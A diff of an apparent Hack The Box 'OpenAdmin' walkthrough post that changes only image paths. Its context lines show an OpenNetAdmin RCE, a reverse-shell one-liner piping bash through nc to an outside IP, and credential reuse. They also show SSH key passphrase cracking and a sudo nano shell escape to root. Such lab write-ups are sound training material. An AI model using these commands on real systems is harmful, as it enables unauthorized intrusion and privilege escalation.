@@ -59,7 +59,7 @@ PORT   STATE SERVICE REASON         VERSION
 
 Whoa! This is a shit-show man. In any case, this is what the site looks like.
 
-{% include image.html image_alt="775f14ec.png" image_src="/assets/images/posts/openadmin-htb-walkthrough/775f14ec.png" %}
+{% include image.html image_alt="775f14ec.png" image_src="/f536755e-99ad-4b81-a7a0-284abfc8bd18/775f14ec.png" %}
 
 You can't get more default than this :laughing:
 
@@ -98,11 +98,11 @@ Interesting. It appears that we have two directories: artwork and music. This is
 
 _`/artwork`_
 
-{% include image.html image_alt="7eae3f90.png" image_src="/assets/images/posts/openadmin-htb-walkthrough/7eae3f90.png" %}
+{% include image.html image_alt="7eae3f90.png" image_src="/f536755e-99ad-4b81-a7a0-284abfc8bd18/7eae3f90.png" %}
 
 _`/music`_
 
-{% include image.html image_alt="349f6169.png" image_src="/assets/images/posts/openadmin-htb-walkthrough/349f6169.png" %}
+{% include image.html image_alt="349f6169.png" image_src="/f536755e-99ad-4b81-a7a0-284abfc8bd18/349f6169.png" %}
 
 They are both apparently very good-looking templates but only one of them offers the path forward. If you look at `/music`, there's a hyperlink to `/ona`, which stands for OpenNetAdmin.
 
@@ -111,7 +111,7 @@ They are both apparently very good-looking templates but only one of them offers
 
 This is how it looks like.
 
-{% include image.html image_alt="8cae4dae.png" image_src="/assets/images/posts/openadmin-htb-walkthrough/8cae4dae.png" %}
+{% include image.html image_alt="8cae4dae.png" image_src="/f536755e-99ad-4b81-a7a0-284abfc8bd18/8cae4dae.png" %}
 
 I think we have the exploit we need in EDB-ID [47691](https://www.exploit-db.com/exploits/47691). After understanding what the exploit does, I modified it a little to suit my needs.
 
@@ -133,7 +133,7 @@ curl -i \
 
 Let's give it a shot.
 
-{% include image.html image_alt="d65b807d.png" image_src="/assets/images/posts/openadmin-htb-walkthrough/d65b807d.png" %}
+{% include image.html image_alt="d65b807d.png" image_src="/f536755e-99ad-4b81-a7a0-284abfc8bd18/d65b807d.png" %}
 
 Awesome.
 
@@ -145,7 +145,7 @@ With that, it's pretty trivial to get a reverse shell albeit a low-privileged on
 # ./cmd.sh "rm -rf /tmp/p; mknod /tmp/p p; /bin/bash </tmp/p | nc 10.10.15.195 1234 >/tmp/p"
 ```
 
-{% include image.html image_alt="e7783893.png" image_src="/assets/images/posts/openadmin-htb-walkthrough/e7783893.png" %}
+{% include image.html image_alt="e7783893.png" image_src="/f536755e-99ad-4b81-a7a0-284abfc8bd18/e7783893.png" %}
 
 Bam. There you have it.
 
@@ -153,19 +153,19 @@ Bam. There you have it.
 
 During enumeration of `www-data`'s account, I notice that there are two accounts in the same group: `jimmy` (1000) and `joanna` (1001).
 
-{% include image.html image_alt="2ea45d44.png" image_src="/assets/images/posts/openadmin-htb-walkthrough/2ea45d44.png" %}
+{% include image.html image_alt="2ea45d44.png" image_src="/f536755e-99ad-4b81-a7a0-284abfc8bd18/2ea45d44.png" %}
 
 They are both are in the `internal` group.
 
-{% include image.html image_alt="6fd57427.png" image_src="/assets/images/posts/openadmin-htb-walkthrough/6fd57427.png" %}
+{% include image.html image_alt="6fd57427.png" image_src="/f536755e-99ad-4b81-a7a0-284abfc8bd18/6fd57427.png" %}
 
 A simple `find` for resources associated with the `internal` group reveals the following.
 
-{% include image.html image_alt="e549155c.png" image_src="/assets/images/posts/openadmin-htb-walkthrough/e549155c.png" %}
+{% include image.html image_alt="e549155c.png" image_src="/f536755e-99ad-4b81-a7a0-284abfc8bd18/e549155c.png" %}
 
 Further digging into virtual hosts configuration reveals the following.
 
-{% include image.html image_alt="a18a13ba.png" image_src="/assets/images/posts/openadmin-htb-walkthrough/a18a13ba.png" %}
+{% include image.html image_alt="a18a13ba.png" image_src="/f536755e-99ad-4b81-a7a0-284abfc8bd18/a18a13ba.png" %}
 
 Well, I know what to do but in any case, I'll still need to log in to `jimmy`'s account first.
 
@@ -173,7 +173,7 @@ Well, I know what to do but in any case, I'll still need to log in to `jimmy`'s 
 
 I chanced upon ONA's database configuration while I was exploring the `/opt/ona/www` directory.
 
-{% include image.html image_alt="06c6a6fe.png" image_src="/assets/images/posts/openadmin-htb-walkthrough/06c6a6fe.png" %}
+{% include image.html image_alt="06c6a6fe.png" image_src="/f536755e-99ad-4b81-a7a0-284abfc8bd18/06c6a6fe.png" %}
 
 Hmm. The password `n1nj4W4rri0R!` piques my curiosity. Maybe it's the password to one of the accounts? There's only one way to find out.
 
@@ -181,11 +181,11 @@ Hmm. The password `n1nj4W4rri0R!` piques my curiosity. Maybe it's the password t
 
 Indeed. It's `jimmy`'s password.
 
-{% include image.html image_alt="504c1d7c.png" image_src="/assets/images/posts/openadmin-htb-walkthrough/504c1d7c.png" %}
+{% include image.html image_alt="504c1d7c.png" image_src="/f536755e-99ad-4b81-a7a0-284abfc8bd18/504c1d7c.png" %}
 
 Now, we can navigate to `/var/www/internal` to look at its contents.
 
-{% include image.html image_alt="7c6517fb.png" image_src="/assets/images/posts/openadmin-htb-walkthrough/7c6517fb.png" %}
+{% include image.html image_alt="7c6517fb.png" image_src="/f536755e-99ad-4b81-a7a0-284abfc8bd18/7c6517fb.png" %}
 
 There's something interesting in `index.php`.
 
@@ -212,33 +212,33 @@ ssh -L 52846:127.0.0.1:52846 -i jimmy jimmy@10.10.10.171
 
 Once that's done, I should have a local port listening at `52846/tcp`.
 
-{% include image.html image_alt="cb2ea8c2.png" image_src="/assets/images/posts/openadmin-htb-walkthrough/cb2ea8c2.png" %}
+{% include image.html image_alt="cb2ea8c2.png" image_src="/f536755e-99ad-4b81-a7a0-284abfc8bd18/cb2ea8c2.png" %}
 
 #### Accessing `joanna`'s SSH private key
 
 Suffice to say, I added `internal.openadmin.htb` to `/etc/hosts` mapping it to `127.0.0.1`.
 
-{% include image.html image_alt="01fc96b2.png" image_src="/assets/images/posts/openadmin-htb-walkthrough/01fc96b2.png" %}
+{% include image.html image_alt="01fc96b2.png" image_src="/f536755e-99ad-4b81-a7a0-284abfc8bd18/01fc96b2.png" %}
 
 After logging in, `joanna`'s SSH password-protected private key is revealed along with a hint what the password might be.
 
-{% include image.html image_alt="73bbc349.png" image_src="/assets/images/posts/openadmin-htb-walkthrough/73bbc349.png" %}
+{% include image.html image_alt="73bbc349.png" image_src="/f536755e-99ad-4b81-a7a0-284abfc8bd18/73bbc349.png" %}
 
 #### John the Ripper
 
 Enter JtR.
 
-{% include image.html image_alt="8fa14feb.png" image_src="/assets/images/posts/openadmin-htb-walkthrough/8fa14feb.png" %}
+{% include image.html image_alt="8fa14feb.png" image_src="/f536755e-99ad-4b81-a7a0-284abfc8bd18/8fa14feb.png" %}
 
 The password to unlock `joanna`'s private key is `bloodninjas`. With that, we can finally log in to `joanna`'s account and retrieve `user.txt`.
 
-{% include image.html image_alt="3eb09f1d.png" image_src="/assets/images/posts/openadmin-htb-walkthrough/3eb09f1d.png" %}
+{% include image.html image_alt="3eb09f1d.png" image_src="/f536755e-99ad-4b81-a7a0-284abfc8bd18/3eb09f1d.png" %}
 
 ## Privilege Escalation
 
 During enumeration of `joanna`'s account, I notice that `joanna` is able to `sudo` `nano` to open `/opt/priv`.
 
-{% include image.html image_alt="a3b414ee.png" image_src="/assets/images/posts/openadmin-htb-walkthrough/a3b414ee.png" %}
+{% include image.html image_alt="a3b414ee.png" image_src="/f536755e-99ad-4b81-a7a0-284abfc8bd18/a3b414ee.png" %}
 
 ### GTFOBins
 
@@ -252,7 +252,7 @@ reset; sh 1>&0 2>&0
 
 Armed with a `root` shell, getting `root.txt` is trivial.
 
-{% include image.html image_alt="61563036.png" image_src="/assets/images/posts/openadmin-htb-walkthrough/61563036.png" %}
+{% include image.html image_alt="61563036.png" image_src="/f536755e-99ad-4b81-a7a0-284abfc8bd18/61563036.png" %}
 
 :dancer:
 
